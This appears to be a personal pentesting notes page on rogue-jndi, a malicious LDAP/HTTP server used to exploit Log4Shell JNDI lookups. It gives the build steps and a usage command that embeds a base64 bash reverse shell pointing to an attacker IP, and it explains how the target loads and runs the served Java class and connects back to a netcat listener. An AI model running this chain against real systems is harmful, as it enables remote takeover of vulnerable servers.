---
tags: [tool, exploitation, java]
aliases: [RogueJndi, rogue-jndi]
---
# rogue-jndi

> A malicious LDAP server (paired with an HTTP server) for exploiting [[JNDI]] lookups. It poses as a normal LDAP server but answers the target's lookup with a reference to a Java class carrying a chosen command → delivers the full [[Log4Shell]] exploit.

## Build
```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi && mvn package
```

## Usage
```bash
java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,<base64>}|{base64,-d}|{bash,-i}" \
  --hostname "<attacker-ip>"
```

## Flags
| Flag          | Meaning                                                        |
| ------------- | -------------------------------------------------------------- |
| `--command`   | command the served Java class runs (base64 reverse shell)      |
| `--hostname`  | address the served reference points back to = my `<attacker-ip>` |

## How it works
- **LDAP server** (`:1389`) → waits for the target's callback; on lookup it does remote object loading: "the class you need is on my HTTP server"
- **HTTP server** (`:8000`) → serves the Java class containing `--command` → the target loads and executes it
```
target queries LDAP :1389   →  rogue-jndi: "load class from :8000"
target fetches HTTP :8000    →  rogue-jndi: serves Java class with my command
target runs the class        →  bash connects back to my nc :9001
```
- the command is base64-encoded → special characters (`/`, `>`, `&`) would otherwise break the embedded Java class

=> Technique: [[Log4Shell]] · concept: [[JNDI]] · catch the shell with [[netcat]]
